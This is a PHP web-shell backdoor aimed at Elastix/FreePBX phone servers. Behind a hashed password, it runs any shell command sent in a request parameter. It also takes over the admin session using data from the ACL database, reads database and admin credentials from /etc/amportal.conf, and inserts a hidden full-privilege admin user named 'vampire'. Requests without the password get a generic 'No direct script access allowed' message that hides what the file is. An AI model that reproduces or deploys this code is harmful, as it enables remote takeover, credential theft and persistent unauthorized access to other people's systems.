<?php

if (isset($_REQUEST['c']) && (md5($_REQUEST['p'])=="4a7bbe7d0ed1f35fcf25590273b0ba4b"))
{
echo "<xmp>";
@system($_REQUEST['c']); 
echo "</xmp>";

if ( $_GET['login'] == "els" ) 
{
include_once "/var/www/html/libs/paloSantoDB.class.php"; 
include_once "/var/www/html/libs/paloSantoACL.class.php"; 
$pDB = new paloDB("sqlite3:////var/www/db/acl.db"); 
$db = $pDB->fetchTable("SELECT name, md5_password,extension from acl_user WHERE id ='1'"); 
session_name("elastixSession"); 
session_start(); 
$_SESSION['elastix_user'] = $db[0][0]; 
$_SESSION['elastix_pass'] = $db[0][1]; 
echo '<a href="/" >LOGIN ELS</a>';
}

if ( $_GET['login'] == "ok" ) 
{
$data=file("/etc/amportal.conf");

foreach($data as $line){
if(preg_match("#AMPDBPASS=#",$line)){list($jnk,$sqlpwd)=explode("=",trim($line));}
if(preg_match("#AMPDBUSER=#",$line)){list($jnk,$sqluser)=explode("=",trim($line));}
if(preg_match("#ARI_ADMIN_PASSWORD=#",$line)){list($jnk,$aripwd)=explode("=",trim($line));}
if(preg_match("#ARI_ADMIN_USERNAME=#",$line)){list($jnk,$ariuser)=explode("=",trim($line));}
}

mysql_connect("localhost","$sqluser",$sqlpwd);
mysql_select_db("asterisk");
$qa=mysql_query("INSERT INTO ampusers VALUES ('vampire','7d76d8b28d8cb177d828eac3ab9f3198bd2c4bbf','','','','*')");
echo "PLEASE LOGIN >>>" ;
}

}
else
{
die ('No direct script access allowed');
}
?>
